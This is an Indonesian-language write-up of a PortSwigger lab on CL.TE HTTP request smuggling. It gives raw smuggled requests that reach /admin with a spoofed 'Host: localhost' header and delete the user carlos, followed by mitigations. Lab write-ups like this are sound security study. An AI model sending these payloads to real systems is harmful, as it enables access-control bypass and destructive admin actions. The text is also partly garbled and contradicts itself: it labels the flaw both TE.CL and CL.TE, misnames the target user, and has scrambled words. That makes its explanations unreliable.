# Eksploitasi HTTP Request Smuggling (Tipe TE.CL) untuk Melembangi Kontrol Keamanan Front-End

**Tanggal:** Oktober 2026  
**Lab:** Web Security Academy — PortSwigger  
**Judul Lab:** Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability  
**Tingkat:** PRACTITIONER  
**URL Lab:** `https://0a13007404bed62a81f2fc9b0062005c.web-security-academy.net/`  
**Penulis:** betzq  
**Status Lab:** Selesai (Solved)

---

## 1. Pendahuluan Teoretis

HTTP Request Smuggling adalah kelas kerentanan yang muncul ketika dua atau lebih server HTTP (biasanya front-end proxy/WAF dan back-end server) menafisihkan batas antara satu request HTTP dan request berikutnya dalam satu koneksi TCP yang sama secara berbeda. Akar masalahnya adalah konflik spesifikasi RFC antara dua header yang digunakan untuk menyatakan panjang isi request: `Content-Length` (CL) dan `Transfer-Encoding` (TE).

Pada arsitektur proksi/WAF modern, front-end server biasanya menerima request dari klien lalu meneruskannya ke back-end. Jika front-end memprioritaskan satu header (misalnya CL) sementara back-end memprioritaskan header lain (misalnya TE), atau sebaliknya, maka kedua server dapat tidak sepakat tentang di mana request pertama berakhir dan request kedua dimulai. Kondisi ini memungkinkan penyerah untuk "menyelinapkan" (smuggle) sebuah request prefiks ke dalam antrean back-end, sehingga request korban yang dikirim sesaat setelahnya dianggap sebagai bagian dari request penyerah.

Dalam kasus tipe **CL.TE** (Content-Length dan Transfer-Encoding), front-end menggunakan `Content-Length` untuk menentukan panjang tubuh request, sementara back-end menggunakan `Transfer-Encoding: chunked`. Karena front-end dalam laboratorium ini tidak mendukung encoding chunked, ia mengabaikan atau menafsirkan `Transfer-Encoding` secara berbeda dari back-end, sehingga menciptakan celah yang dapat dieksploitasi untuk membatasi akses ke halaman administratif (`/admin`) yang seharusnya diblokir.

---

## 2. Metodologi Eksploitasi (Langkah demi Langkah)

Tujuan eksploitasi dalam laboratorium ini adalah menyelundupkan request ke `/admin` melalui front-end yang biasanya memblokirnya, kemudian mengubah URL request yang diselundupkan untuk menghapus pengguna `carcos` melalui endpoint `/admin/delete?username=carlos`.

### Langkah 1: Mengakses /admin secara langsung (diblokir)

Kunjungi `GET /admin` melalui browser atau Burp Repeater. Respons yang diterima menunjukkan bahwa front-end server memblokir akses ke panel administratif.

```
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Langkah 2: Percobaan pertama smuggling (diawali oleh front-end)

Kirimkan request berikut **dua kali** berturut-turut di Burp Repeater:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Hasil: Request gabungan ke `/admin` ditolak karena tidak menggunakan header `Host: localhost`.

### Langkah 3: Percobaan kedua smuggling (konflik Host header)

Kirimkan request berikut **dua kali** berturut-turut:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

Hasil: Request diblokir karena header `Host` pada request kedua bertabrakan dengan header `Host` yang diselundupkan pada request pertama.

### Langkah 4: Menyisipkan header sebagai bagian tubuh request yang diselundupkan

Kirimkan request berikut **dua kali** berturut-turut agar header request kedua ditambahkan ke dalam tubuh request yang diselundupkan:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Hasil: Anda sekarang dapat mengakses panel administratif. Front-end mengabaikan sisa data setelah chunk terminator `0`, sementara back-end memprosesnya sebagai request baru dengan `Host: localhost`.

### Langkah 5: Menghapus pengguna carlos

Menggunakan respons dari langkah sebelumnya sebagai referensi, ubah URL request yang diselundupkan menjadi `/admin/delete?username=carlos`:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Setelah request dikirim, pengguna `carlos` berhasil dihapus dan lab tercapai status **Solved**.

---

## 3. Analisis Teknis Payload

| Komponen | Penjelasan |
|----------|------------|
| `Transfer-Encoding: chunked` | Memberitahu back-end bahwa tubuh request menggunakan format chunked encoding. |
| `Content-Length: 139` | Digunakan front-end untuk menentukan ukuran tubuh request. Karena 139 mencakup seluruh sisa data termasuk request yang diselundupkan, front-end menganggap seluruhnya sebagai satu request tunggal. |
| Chunk terminator `0` | Menandai akhir tubuh chunked bagi back-end. Segala sesuatu setelahnya dianggap sebagai permintaan HTTP baru dalam koneksi yang sama (pipelining). |
| `Host: localhost` | Memaksa back-end menangani request selanjutnya sebagai localhost, sehingga pembatasan akses front-end terhadap `/admin` dapat dihindari. |
| `Content-Length: 10` + `x=` | Memastikan tubuh request kedua pas dengan panjang yang diharapkan agar back-end tidak menunda atau menolak pemrosesan. |

Penting untuk diperhatikan: meskipun lab mendukung HTTP/2, teknik sengaja ini hanya dapat dilakukan pada **HTTP/1.1**. Oleh karena itu, protokol harus dipindahkan secara manual ke HTTP/1.1 di Burp Repeater melalui bagian *Request attributes* pada panel *Inspector*.

---

## 4. Dampak Bisnis (Business Impact)

Eksploitasi HTTP Request Smuggling tipe TE.CL dapat menyebabkan risiko keamanan yang serius, antara lain:

1. **Cache Poisoning** — Penyerah dapat menyelundupkan respons yang dimasukkan ke dalam cache front-end, sehingga pengguna lain yang melakukan request yang sama akan menerima respons yang dimiliki oleh penyerah atau respons yang tidak sah.
2. **Pembajakan Sesi Pengguna Lain (Session Hijacking)** — Request yang diselundupkan dapat membawa kuki atau header otorisasi milik penyerah, yang kemudian dikaitkan dengan sesi korban berikutnya yang menggunakan koneksi back-end yang sama.
3. **Bypass WAF dan Kontrol Akses Front-End** — Seperti dalam laboratorium ini, halaman administratif atau endpoint sensitif yang diblokir oleh front-end dapat diakses melalui back-end dengan menyelundupkan request yang memalsukan header `Host` atau path.
4. **Peretasan Data dan Akun** — Dalam kasus ini, penyerah berhasil menghapus pengguna `carcos`. Dalam skenario nyata, teknik serupa dapat digunakan untuk mengubah data, mengambil informasi sensitif, atau mencuri kredensial.

---

## 5. Mitigasi

Untuk mengatasi kerentanan HTTP Request Smuggling, disarankan tindakan teknis berikut kepada pengembang dan tim operasional:

1. **Normalisasi paksa di front-end** — Konfigurasikan server proxy/WAF untuk menolak request yang mengandung baik `Content-Length` maupun `Transfer-Encoding` secara bersamaan, atau standarisasikan salah satu sebelum meneruskan ke back-end.
2. **Nonaktifkan penggunaan kembali koneksi back-end** — Jika memungkinkan, jangan biarkan front-end menggunakan kembali koneksi HTTP ke back-end untuk beberapa klien. Setiap klien harus mendapatkan koneksi back-end yang terisolasi sehingga request diselundupkan tidak dapat menumpangi request korban.
3. **Menerapkan HTTP/2 end-to-end** — HTTP/2 menggunakan framing yang berbeda dan tidak rentan pada teknik smuggling klasik CL.TE. Pastikan seluruh jalur dari klien hingga back-end menggunakan HTTP/2.
4. **Validasi header Host** — Terapkan kebijakan ketat pada header `Host` di back-end sehingga permintaan dengan `Host: localhost` dari front-end yang tidak diizinkan akan ditolak.
5. **Perbarui dan konfigurasi server web** — Gunakan versi terbaru Nginx, Apache, atau HAProxy yang telah menyertakan perlindungan terhadap HTTP Request Smuggling, dan aktifkan opsi normalisasi header yang tersedia.
6. **Pemisahan jaringan** — Batasi akses langsung dari front-end ke back-end hanya melalui port dan path yang diperlukan, sehingga meski smuggling berhasil, back-end tidak mengekspos endpoint administratif tanpa otentikasi tambahan.

---

## 6. Kesimpulan

Laboratorium ini mengemontrasikan bagaimana perbedaan tafsir antara front-end dan back-end terhadap header `Content-Length` dan `Transfer-Encoding` dapat dieksploitasi untuk melanggar kontrol akses. Dengan menyelundupkan request `GET /admin/delete?username=carlos` melalui koneksi yang sama, penyerah berhasil melewati pembatasan front-end dan menghapus pengguna target. Temuan ini menekankan pentingnya normalisasi HTTP yang konsisten di semua lapisan infrastruktur serta penggunaan protokol modern seperti HTTP/2 untuk mengurangi permukaan serangan request smuggling.

---

### Cara Menggunakan Write-up Ini

1. Salin seluruh isi file `write-up.md` di atas.
2. Buat akun di [Medium](https://medium.com/) atau aktifkan **GitHub Pages** pada repositori Anda.
3. Tempelkan konten ke editor Medium atau buat file `.md` di folder `docs/` repositori GitHub Pages.
4. Publikasikan sebagai artikel publik agar rekruter dapat melihat buktian riset keamanan Anda.
